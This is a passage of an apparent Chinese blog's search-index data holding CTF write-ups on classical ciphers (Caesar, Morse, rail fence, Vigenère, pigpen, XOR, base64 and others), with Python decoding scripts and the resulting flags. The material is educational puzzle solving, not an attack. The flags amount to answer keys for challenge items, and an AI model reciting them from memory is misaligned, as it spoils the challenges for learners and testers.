== <span class=\"built_in\">len</span>(s))</span><br><span class=\"line\">            mds = hashlib.md5(ss.encode(<span class=\"string\">&#x27;utf-8&#x27;</span>)).hexdigest().lower()</span><br><span class=\"line\">            <span class=\"keyword\">if</span> mds[:<span class=\"number\">4</span>] == md5[:<span class=\"number\">4</span>] <span class=\"keyword\">and</span> mds[<span class=\"number\">7</span>:<span class=\"number\">11</span>] == md5[<span class=\"number\">7</span>:]:</span><br><span class=\"line\">                <span class=\"built_in\">print</span>(mds)</span><br><span class=\"line\">                <span class=\"keyword\">break</span></span><br></pre></td></tr></table></figure>\r\n<p>得到结果为<code>E9032994DABAC08080091151380478A2</code></p>\r\n<h2 id=\"古典密码1\">古典密码1</h2>\r\n<p>打开文件，发现内容如下： &gt; iodj{36g9i2777 &gt; &gt; -... ----. ..--- -... .- -.-. ...-- ----. .- .- ..--- &gt; &gt; a0dd}b6942c07</p>\r\n<p>第1为凯撒加密，第2为摩尔斯密码，第3为栅栏密码</p>\r\n<p>凯撒和摩尔斯密码解密脚本如下：</p>\r\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 凯撒密码</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">decrypt_ks</span>(<span class=\"params\">s : <span class=\"built_in\">str</span></span>):</span><br><span class=\"line\">    s = s.lower()</span><br><span class=\"line\">    <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>,<span class=\"number\">27</span>):</span><br><span class=\"line\">        <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> s:</span><br><span class=\"line\">            <span class=\"keyword\">if</span> i.isalpha():</span><br><span class=\"line\">                <span class=\"built_in\">print</span>(<span class=\"built_in\">chr</span>((<span class=\"built_in\">ord</span>(i) + j - <span class=\"built_in\">ord</span>(<span class=\"string\">&#x27;a&#x27;</span>)) % <span class=\"number\">26</span> + <span class=\"built_in\">ord</span>(<span class=\"string\">&#x27;a&#x27;</span>)), end=<span class=\"string\">&#x27;&#x27;</span>)</span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                <span class=\"built_in\">print</span>(i,end=<span class=\"string\">&#x27;&#x27;</span>)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">decrypt_ks(<span class=\"string\">&#x27;iodj&#123;36g9i2777&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 摩尔斯密码</span></span><br><span class=\"line\">a2mo_dict = &#123;<span class=\"string\">&#x27;a&#x27;</span>: <span class=\"string\">&#x27;.-&#x27;</span>, <span class=\"string\">&#x27;b&#x27;</span>: <span class=\"string\">&#x27;-...&#x27;</span>, <span class=\"string\">&#x27;c&#x27;</span>: <span class=\"string\">&#x27;-.-.&#x27;</span>, <span class=\"string\">&#x27;d&#x27;</span>: <span class=\"string\">&#x27;-..&#x27;</span>, <span class=\"string\">&#x27;e&#x27;</span>: <span class=\"string\">&#x27;.&#x27;</span>,</span><br><span class=\"line\">             <span class=\"string\">&#x27;f&#x27;</span>: <span class=\"string\">&#x27;..-.&#x27;</span>, <span class=\"string\">&#x27;g&#x27;</span>: <span class=\"string\">&#x27;--.&#x27;</span>, <span class=\"string\">&#x27;h&#x27;</span>: <span class=\"string\">&#x27;....&#x27;</span>, <span class=\"string\">&#x27;i&#x27;</span>: <span class=\"string\">&#x27;..&#x27;</span>, <span class=\"string\">&#x27;j&#x27;</span>: <span class=\"string\">&#x27;.---&#x27;</span>,</span><br><span class=\"line\">             <span class=\"string\">&#x27;k&#x27;</span>: <span class=\"string\">&#x27;-.-&#x27;</span>, <span class=\"string\">&#x27;l&#x27;</span>: <span class=\"string\">&#x27;.-..&#x27;</span>, <span class=\"string\">&#x27;m&#x27;</span>: <span class=\"string\">&#x27;--&#x27;</span>, <span class=\"string\">&#x27;n&#x27;</span>: <span class=\"string\">&#x27;-.&#x27;</span>, <span class=\"string\">&#x27;o&#x27;</span>: <span class=\"string\">&#x27;---&#x27;</span>,</span><br><span class=\"line\">             <span class=\"string\">&#x27;p&#x27;</span>: <span class=\"string\">&#x27;.--.&#x27;</span>, <span class=\"string\">&#x27;q&#x27;</span>: <span class=\"string\">&#x27;--.-&#x27;</span>, <span class=\"string\">&#x27;r&#x27;</span>: <span class=\"string\">&#x27;.-.&#x27;</span>, <span class=\"string\">&#x27;s&#x27;</span>: <span class=\"string\">&#x27;...&#x27;</span>, <span class=\"string\">&#x27;t&#x27;</span>: <span class=\"string\">&#x27;-&#x27;</span>,</span><br><span class=\"line\">             <span class=\"string\">&#x27;u&#x27;</span>: <span class=\"string\">&#x27;..-&#x27;</span>, <span class=\"string\">&#x27;v&#x27;</span>: <span class=\"string\">&#x27;...-&#x27;</span>, <span class=\"string\">&#x27;w&#x27;</span>: <span class=\"string\">&#x27;.--&#x27;</span>, <span class=\"string\">&#x27;x&#x27;</span>: <span class=\"string\">&#x27;-..-&#x27;</span>, <span class=\"string\">&#x27;y&#x27;</span>: <span class=\"string\">&#x27;-.--&#x27;</span>, <span class=\"string\">&#x27;z&#x27;</span>: <span class=\"string\">&#x27;--..&#x27;</span>,</span><br><span class=\"line\">             <span class=\"string\">&#x27;0&#x27;</span>: <span class=\"string\">&#x27;-----&#x27;</span>, <span class=\"string\">&#x27;1&#x27;</span>: <span class=\"string\">&#x27;.----&#x27;</span>, <span class=\"string\">&#x27;2&#x27;</span>: <span class=\"string\">&#x27;..---&#x27;</span>, <span class=\"string\">&#x27;3&#x27;</span>: <span class=\"string\">&#x27;...--&#x27;</span>, <span class=\"string\">&#x27;4&#x27;</span>: <span class=\"string\">&#x27;....-&#x27;</span>,</span><br><span class=\"line\">             <span class=\"string\">&#x27;5&#x27;</span>: <span class=\"string\">&#x27;.....&#x27;</span>, <span class=\"string\">&#x27;6&#x27;</span>: <span class=\"string\">&#x27;-....&#x27;</span>, <span class=\"string\">&#x27;7&#x27;</span>: <span class=\"string\">&#x27;--...&#x27;</span>, <span class=\"string\">&#x27;8&#x27;</span>: <span class=\"string\">&#x27;---..&#x27;</span>, <span class=\"string\">&#x27;9&#x27;</span>: <span class=\"string\">&#x27;----.&#x27;</span></span><br><span class=\"line\">             &#125;</span><br><span class=\"line\">mo2a_dict = <span class=\"built_in\">dict</span>(<span class=\"built_in\">zip</span>(a2mo_dict.values(), a2mo_dict.keys()))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">decrypt_ms</span>(<span class=\"params\">s: <span class=\"built_in\">str</span>, split: <span class=\"built_in\">str</span></span>):</span><br><span class=\"line\">    l = s.split(split)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> l:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(mo2a_dict[i],end=<span class=\"string\">&#x27;&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">decrypt_ms(<span class=\"string\">&#x27;-... ----. ..--- -... .- -.-. ...-- ----. .- .- ..---&#x27;</span>,<span class=\"string\">&#x27; &#x27;</span>)</span><br></pre></td></tr></table></figure>\r\n<p>得到解密内容1、2分别为：<code>flag&#123;36d9f2777</code>、<code>b92bac39aa2</code>，使用之前的栅栏密码解码脚本解密内容3，得到<code>ab206cd90d47&#125;</code>，因此flag为<code>flag&#123;36d9f2777b92bac39aa2ab206cd90d47&#125;</code></p>\r\n","categories":["CTF"],"tags":["crypto","classical cryptography"]},{"title":"古典密码题解 3","url":"/2022/09/12/%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81%E9%A2%98%E8%A7%A3-3/","content":"<h2 id=\"世上无难事\">世上无难事</h2>\r\n<h3 id=\"题目\">题目</h3>\r\n<p>以下为某国总统外发的一段指令，经过一种奇怪的加密方式，看来只能用分析方法了，请将这段语句还原成通顺语句，并从其中找到KEY作为答案提交：</p>\r\n<span id=\"more\"></span>\r\n<blockquote>\r\n<p>VIZZB IFIUOJBWO NVXAP OBC XZZ UKHVN IFIUOJBWO HB XVIXW XAW VXFI X QIXN VBD KQ IFIUOJBWO WBKAH NBWXO VBD XJBCN NKG QLKEIU DI XUI VIUI DKNV QNCWIANQ XN DXPIMKIZW VKHV QEVBBZ KA XUZKAHNBA FKUHKAKX XAW DI VXFI HBN QNCWIANQ NCAKAH KA MUBG XZZ XEUBQQ XGIUKEX MUBG PKAWIUHXUNIA NVUBCHV 12NV HUXWI XAW DI XUI SCQN QB HZXW NVXN XZZ EBCZW SBKA CQ NBWXO XAW DI DXAN NB NVXAP DXPIMKIZW MBU JIKAH QCEV XA BCNQNXAWKAH VBQN HKFI OBCUQIZFIQ X JKH UBCAW BM XLLZXCQI XAW NVI PIO KQ 640I11012805M211J0XJ24MM02X1IW09</p>\r\n</blockquote>\r\n<h3 id=\"解题\">解题</h3>\r\n<p>应当采用词频分析，可以看出 VIZZB = HELLO，使用<a href=\"https://quipqiup.com/\">词频分析网站</a>，可得结果为： &gt; HELLO EVERYBODY THANK YOU ALL RIGHT EVERYBODY GO AHEAD AND HAVE A SEAT HOW IS EVERYBODY DOING TODAY HOW ABOUT TIM SPICER WE ARE HERE WITH STUDENTS AT WAKEFIELD HIGH SCHOOL IN ARLINGTON VIRGINIA AND WE HAVE GOT STUDENTS TUNING IN FROM ALL ACROSS AMERICA FROM KINDERGARTEN THROUGH 12TH GRADE AND WE ARE JUST SO GLAD THAT ALL COULD JOIN US TODAY AND WE WANT TO THANK WAKEFIELD FOR BEING SUCH AN OUTSTANDING HOST GIVE YOURSELVES A BIG ROUND OF APPLAUSE AND THE KEY IS 640E11012805F211B0AB24FF02A1ED09</p>\r\n<p>因此flag为<code>640e11012805f211b0ab24ff02a1ed09</code></p>\r\n<h2 id=\"其实很简单\">其实很简单</h2>\r\n<h3 id=\"题目-1\">题目</h3>\r\n<p>学习凯撒密码后，密码前辈又创造出新奇异的加密方法，维吉尼亚是其中一种。出题者是一个程序员，喜欢拿helloworld做秘钥，下面是密文：dlpcsegkshrjj。</p>\r\n<h3 id=\"解题-1\">解题</h3>\r\n<p>编写脚本如下：</p>\r\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">decrypt</span>(<span class=\"params\">key, enc_txt</span>):</span><br><span class=\"line\">    res = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">    key_len = <span class=\"built_in\">len</span>(key)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"built_in\">len</span>(enc_txt)):</span><br><span class=\"line\">        <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>, <span class=\"number\">26</span>):</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (<span class=\"built_in\">ord</span>(key[i % key_len]) - <span class=\"built_in\">ord</span>(<span class=\"string\">&#x27;a&#x27;</span>) + j)  % <span class=\"number\">26</span>  + <span class=\"built_in\">ord</span>(<span class=\"string\">&#x27;a&#x27;</span>) == <span class=\"built_in\">ord</span>(enc_txt[i]):</span><br><span class=\"line\">                res += <span class=\"built_in\">chr</span>(j + <span class=\"built_in\">ord</span>(<span class=\"string\">&#x27;a&#x27;</span>))</span><br><span class=\"line\">                <span class=\"keyword\">break</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> res</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(decrypt(<span class=\"string\">&#x27;helloworld&#x27;</span>, <span class=\"string\">&#x27;dlpcsegkshrjj&#x27;</span>))</span><br></pre></td></tr></table></figure>\r\n<p>运行结果为<code>whereisthekey</code></p>\r\n<h2 id=\"密码学的心声\">密码学的心声</h2>\r\n<h3 id=\"题目-2\">题目</h3>\r\n<p>二战时期，某国军官与一个音乐家情妇相好，然而自从那时起，他屡战屡败，敌人似乎料事如神。他也有怀疑过他的情妇，但是他经过24小时观察他的情妇，发现她每天都只是作曲，然后弹奏给战地电台，为士兵们鼓气，并未有任何逾越。那么，间谍到底是谁？这张曲谱是否有猫腻？</p>\r\n<figure>\r\n<img src=\"/2022/09/12/%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81%E9%A2%98%E8%A7%A3-3/谱子.png\" alt=\"谱子.png\"><figcaption aria-hidden=\"true\">谱子.png</figcaption>\r\n</figure>\r\n<h3 id=\"解题-2\">解题</h3>\r\n<p>题目提示没有8，因此将八进制转换为Ascii，编写脚本如下：</p>\r\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">s = <span class=\"string\">&#x27;111114157166145123145143165162151164171126145162171115165143150&#x27;</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">len</span>(s))</span><br><span class=\"line\">i = <span class=\"number\">0</span></span><br><span class=\"line\"><span class=\"keyword\">while</span> i &lt; <span class=\"built_in\">len</span>(s):</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"built_in\">chr</span>(<span class=\"built_in\">int</span>(s[i:i+<span class=\"number\">3</span>], <span class=\"number\">8</span>)), end =<span class=\"string\">&#x27;&#x27;</span>)</span><br><span class=\"line\">    i += <span class=\"number\">3</span></span><br></pre></td></tr></table></figure>\r\n<p>结果为<code>ILoveSecurityVeryMuch</code></p>\r\n<h2 id=\"萌萌哒的八戒\">萌萌哒的八戒</h2>\r\n<h3 id=\"题目-3\">题目</h3>\r\n<p>萌萌哒的八戒原来曾经是猪村的村长，从远古时期，猪村就有一种神秘的代码。请从附件中找出代码，看看萌萌哒的猪八戒到底想说啥</p>\r\n<h3 id=\"解题-3\">解题</h3>\r\n<p>根据题目信息，提示为猪圈密码，打开图片后如下所示： <img src=\"/2022/09/12/%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81%E9%A2%98%E8%A7%A3-3/猪圈1.png\" alt=\"猪圈1.png\"></p>\r\n<figure>\r\n<img src=\"/2022/09/12/%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81%E9%A2%98%E8%A7%A3-3/猪圈2.png\" alt=\"猪圈2.png\"><figcaption aria-hidden=\"true\">猪圈2.png</figcaption>\r\n</figure>\r\n<p>根据猪圈密码，解得flag为<code>whenthepigwanttoeat</code></p>\r\n<h2 id=\"两种密码\">两种密码</h2>\r\n<h3 id=\"解题-4\">解题</h3>\r\n<p>根据题目信息，发现Bill.txt和Ciphertext.txt，加密方式包含Bill密码，编写脚本如下：</p>\r\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">index = [<span class=\"number\">34</span>, <span class=\"number\">6</span>, <span class=\"number\">13</span>, <span class=\"number\">43</span>, <span class=\"number\">68</span>, <span class=\"number\">21</span>, <span class=\"number\">43</span>, <span class=\"number\">1</span>, <span class=\"number\">77</span>, <span class=\"number\">100</span>, <span class=\"number\">6</span>, <span class=\"number\">41</span>, <span class=\"number\">5</span>, <span class=\"number\">54</span>, <span class=\"number\">68</span>, <span class=\"number\">100</span>, <span class=\"number\">3</span>, <span class=\"number\">6</span>, <span class=\"number\">13</span>, <span class=\"number\">68</span>, <span class=\"number\">41</span>, <span class=\"number\">2</span>, <span class=\"number\">34</span>, <span class=\"number\">23</span>, <span class=\"number\">56</span>, <span class=\"number\">56</span>, <span class=\"number\">56</span>, <span class=\"number\">56</span>, <span class=\"number\">56</span>, <span class=\"number\">56</span>, <span class=\"number\">56</span>, <span class=\"number\">56</span>, <span class=\"number\">5</span>, <span class=\"number\">5</span>, <span class=\"number\">23</span>, <span class=\"number\">56</span>, <span class=\"number\">34</span>, <span class=\"number\">56</span>, <span class=\"number\">94</span>, <span class=\"number\">5</span>, <span class=\"number\">5</span>, <span class=\"number\">56</span>, <span class=\"number\">56</span>, <span class=\"number\">56</span>, <span class=\"number\">56</span>, <span class=\"number\">94</span>, <span class=\"number\">5</span>, <span class=\"number\">5</span>, <span class=\"number\">56</span>, <span class=\"number\">94</span>, <span class=\"number\">34</span>, <span class=\"number\">23</span>, <span class=\"number\">56</span>, <span class=\"number\">5</span>, <span class=\"number\">5</span>, <span class=\"number\">23</span>, <span class=\"number\">56</span>, <span class=\"number\">56</span>, <span class=\"number\">56</span>, <span class=\"number\">56</span>, <span class=\"number\">5</span>, <span class=\"number\">5</span>, <span class=\"number\">23</span>, <span class=\"number\">56</span>, <span class=\"number\">34</span>, <span class=\"number\">56</span>, <span class=\"number\">94</span>, <span class=\"number\">5</span>, <span class=\"number\">5</span>, <span class=\"number\">56</span>, <span class=\"number\">56</span>, <span class=\"number\">56</span>, <span class=\"number\">56</span>, <span class=\"number\">94</span>, <span class=\"number\">5</span>, <span class=\"number\">5</span>, <span class=\"number\">56</span>, <span class=\"number\">94</span>, <span class=\"number\">34</span>, <span class=\"number\">23</span>, <span class=\"number\">56</span>, <span class=\"number\">5</span>, <span class=\"number\">5</span>, <span class=\"number\">23</span>, <span class=\"number\">56</span>, <span class=\"number\">56</span>, <span class=\"number\">56</span>, <span class=\"number\">56</span>, <span class=\"number\">56</span>, <span class=\"number\">56</span>, <span class=\"number\">23</span>, <span class=\"number\">56</span>, <span class=\"number\">34</span>]</span><br><span class=\"line\"><span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(<span class=\"string\">&#x27;D:\\CTF\\CRYPTO\\两种密码\\Bill.txt&#x27;</span>, <span class=\"string\">&#x27;r&#x27;</span>) <span class=\"keyword\">as</span> f:</span><br><span class=\"line\">    s = f.read().split(<span class=\"string\">&#x27; &#x27;</span>)</span><br><span class=\"line\">        <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> index:</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(s[i][<span class=\"number\">0</span>], end = <span class=\"string\">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>\r\n<p>结果如下：</p>\r\n<figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">the_decrption_path_is</span><br><span class=\"line\">&lt;--------oo&lt;-</span><br><span class=\"line\">-&gt;oo----&gt;oo-&gt;</span><br><span class=\"line\">&lt;-oo&lt;----oo&lt;-</span><br><span class=\"line\">-&gt;oo----&gt;oo-&gt;</span><br><span class=\"line\">&lt;-oo&lt;------&lt;-</span><br></pre></td></tr></table></figure>\r\n<p>根据结果，发现第二种加密方式为曲路密码，对秘文<code>lf1e7f05&#125;ba83909764e2686e&#123;7a7fsi_galfagb8d004</code>进行排列，得到结果为 <img src=\"/2022/09/12/%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81%E9%A2%98%E8%A7%A3-3/曲路.png\" alt=\"曲路.png\"></p>\r\n<p>因此flag为<code>flag_isflag&#123;7a7f1e8be6862f7d09764e05400938ab&#125;</code></p>\r\n","categories":["CTF"],"tags":["crypto","classical cryptography"]},{"title":"古典密码题解 4","url":"/2022/09/12/%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81%E9%A2%98%E8%A7%A3-4/","content":"<h2 id=\"异性相吸\">异性相吸</h2>\r\n<ol type=\"1\">\r\n<li><p>打开压缩文件</p>\r\n<p><span id=\"more\"></span></p>\r\n<p>发现存在<code>密文.txt</code>和<code>key.txt</code>，根据题目，猜测使用异或进行解密</p></li>\r\n<li><p>编写py脚本如下</p>\r\n<p><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(<span class=\"string\">&#x27;D:\\CTF\\CRYPTO\\异性相吸\\key.txt&#x27;</span>, <span class=\"string\">&#x27;rb&#x27;</span>) <span class=\"keyword\">as</span> f1:</span><br><span class=\"line\"><span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(<span class=\"string\">&#x27;D:\\CTF\\CRYPTO\\异性相吸\\密文.txt&#x27;</span>, <span class=\"string\">&#x27;rb&#x27;</span>) <span class=\"keyword\">as</span> f2:</span><br><span class=\"line\">key = f1.read()</span><br><span class=\"line\">enc = f2.read()</span><br><span class=\"line\">res = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"built_in\">len</span>(key)):</span><br><span class=\"line\">    res += <span class=\"built_in\">chr</span>(key[i] ^ enc[i])</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(res)</span><br></pre></td></tr></table></figure></p></li>\r\n<li><p>得到flag：flag{ea1bc0988992276b7f95b54a7435e89e}</p></li>\r\n</ol>\r\n<h2 id=\"一眼就解密\">一眼就解密</h2>\r\n<ol type=\"1\">\r\n<li><p>查看字符串，为<code>ZmxhZ3tUSEVfRkxBR19PRl9USElTX1NUUklOR30=</code></p></li>\r\n<li><p>根据尾部<code>=</code>号判断为base64编码</p></li>\r\n<li><p>编写py脚本如下：</p>\r\n<p><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> base64; <span class=\"built_in\">print</span>(base64.b64decode(<span class=\"string\">&#x27;ZmxhZ3tUSEVfRkxBR19PRl9USElTX1NUUklOR30=&#x27;</span>))</span><br></pre></td></tr></table></figure></p></li>\r\n<li><p>得到flag：flag{THE_FLAG_OF_THIS_STRING}</p></li>\r\n</ol>\r\n<h2 id=\"四四方方一座城\">四四方方一座城</h2>\r\n<ol type=\"1\">\r\n<li><p>打开压缩包，发现hint.py，打开文件，内容如下：</p>\r\n<p><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> flag <span class=\"keyword\">import</span> FLAG,key1,key2,Offset</span><br><span class=\"line\"><span class=\"keyword\">from</span> enc <span class=\"keyword\">import</span> encrypt</span><br><span class=\"line\"></span><br><span class=\"line\">ciphertext = encrypt(FLAG)</span><br><span class=\"line\">enc_key1 = enc_key2 = <span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> key1:</span><br><span class=\"line\">enc_key1 += <span class=\"built_in\">chr</span>((<span class=\"built_in\">ord</span>(i) ^ <span class=\"number\">0xff</span> &amp; <span class=\"number\">0xaf</span>) + Offset)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> key2:</span><br><span class=\"line\">enc_key2 += <span class=\"built_in\">chr</span>((<span class=\"built_in\">ord</span>(i) ^ <span class=\"number\">0xff</span> &amp; <span class=\"number\">0xaf</span>) + Offset)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span> enc_key1</span><br><span class=\"line\"><span class=\"built_in\">print</span> enc_key2</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#ciphertext:XBBSPASGXRAEUIOHPZ</span></span><br><span class=\"line\"><span class=\"comment\">#enc_key1:VXYjj</span></span><br><span class=\"line\"><span class=\"comment\">#enc_key2:NQLOUVXab</span></span><br></pre></td></tr></table></figure></p>\r\n<p>可以看出flag被加密，推测使用<code>key1</code>和<code>key2</code>加密，其中key1和key2经过编码，得到<code>enc_key1</code>和<code>enc_key2</code>，且Offset偏移未知。</p></li>\r\n<li><p>使用脚本如下，推测Offset值：</p>\r\n<p><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">min_num, max_num = <span class=\"number\">255</span>, <span class=\"number\">0</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"built_in\">ord</span>(<span class=\"string\">&#x27;a&#x27;</span>), <span class=\"built_in\">ord</span>(<span class=\"string\">&#x27;z&#x27;</span>)+<span class=\"number\">1</span>):</span><br><span class=\"line\">    c = i ^ <span class=\"number\">0xff</span> &amp; <span class=\"number\">0xaf</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> c &lt; min_num:</span><br><span class=\"line\">        min_num = c</span><br><span class=\"line\">    <span class=\"keyword\">if</span> c &gt; max_num:</span><br><span class=\"line\">        max_num = c</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"built_in\">ord</span>(<span class=\"string\">&#x27;A&#x27;</span>), <span class=\"built_in\">ord</span>(<span class=\"string\">&#x27;Z&#x27;</span>)+<span class=\"number\">1</span>):</span><br><span class=\"line\">    c = i ^ <span class=\"number\">0xff</span> &amp; <span class=\"number\">0xaf</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> c &lt; min_num:</span><br><span class=\"line\">        min_num = c</span><br><span class=\"line\">    <span class=\"keyword\">if</span> c &gt; max_num:</span><br><span class=\"line\">        max_num = c</span><br><span class=\"line\"><span class=\"built_in\">print</span>(min_num, max_num)</span><br><span class=\"line\">range1 = (<span class=\"built_in\">ord</span>(<span class=\"string\">&#x27;A&#x27;</span>) - max_num, <span class=\"built_in\">ord</span>(<span class=\"string\">&#x27;z&#x27;</span>) - min_num)  <span class=\"comment\"># 初步推测Offset范围</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(range1)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">check</span>(<span class=\"params\">i, key</span>):  <span class=\"comment\"># 检查offset i还原key是否正常</span></span><br><span class=\"line\">    res = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> s <span class=\"keyword\">in</span> key:</span><br><span class=\"line\">        c = (<span class=\"built_in\">ord</span>(s) - i) ^ <span class=\"number\">0xaf</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> (c <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"built_in\">ord</span>(<span class=\"string\">&#x27;A&#x27;</span>), <span class=\"built_in\">ord</span>(<span class=\"string\">&#x27;z&#x27;</span>)+<span class=\"number\">1</span>)):</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">False</span>, res</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            res += <span class=\"built_in\">chr</span>(c)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (<span class=\"literal\">True</span>, res)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">enc_key1 = <span class=\"string\">&#x27;VXYjj&#x27;</span></span><br><span class=\"line\">enc_key2 = <span class=\"string\">&#x27;NQLOUVXab&#x27;</span></span><br><span class=\"line\">enc_txt = <span class=\"string\">&#x27;XBBSPASGXRAEUIOHPZ&#x27;</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(range1[<span class=\"number\">0</span>], range1[<span class=\"number\">1</span>]+<span class=\"number\">1</span>):</span><br><span class=\"line\">    flag1, res1 = check(i, enc_key1)</span><br><span class=\"line\">    flag2, res2 = check(i, enc_key2)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> flag1 <span class=\"keyword\">and</span> flag2:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(i, res1, res2)</span><br><span class=\"line\">        <span class=\"keyword\">break</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></p>\r\n<p>运行结果如下：</p>\r\n<blockquote>\r\n<p>192 255</p>\r\n<p>(-190, -70)</p>\r\n<p>-149 DBAPP LINKEDBYX</p>\r\n</blockquote>\r\n<p>因此offset偏移为<code>-149</code>，且key1和key2分别为：<code>DBAPP</code>，<code>LINKEDBYX</code></p></li>\r\n<li><p>编写解密脚本，求取flag</p>\r\n<p><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> hashlib</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">cons_martix</span>(<span class=\"params\">key: <span class=\"built_in\">str</span></span>):  <span class=\"comment\"># 构造矩阵</span></span><br><span class=\"line\">    key_set = <span class=\"built_in\">set</span>()</span><br><span class=\"line\">    s = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> key:  <span class=\"comment\"># 移除重复字符</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> i <span class=\"keyword\">in</span> key_set:</span><br><span class=\"line\">            s += i</span><br><span class=\"line\">            key_set.add(i)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(key_set)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"built_in\">ord</span>(<span class=\"string\">&#x27;A&#x27;</span>), <span class=\"built_in\">ord</span>(<span class=\"string\">&#x27;Z&#x27;</span>)+<span class=\"number\">1</span>):  <span class=\"comment\"># 添加除key中出现过的26个英文字母(除掉Q)</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> i != <span class=\"built_in\">ord</span>(<span class=\"string\">&#x27;Q&#x27;</span>):</span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"built_in\">chr</span>(i) <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> key_set:</span><br><span class=\"line\">                s += <span class=\"built_in\">chr</span>(i)</span><br><span class=\"line\">                key_set.add(i)</span><br><span class=\"line\">    <span class=\"keyword\">assert</span> (<span class=\"built_in\">len</span>(s) == <span class=\"number\">25</span>)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> s</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title 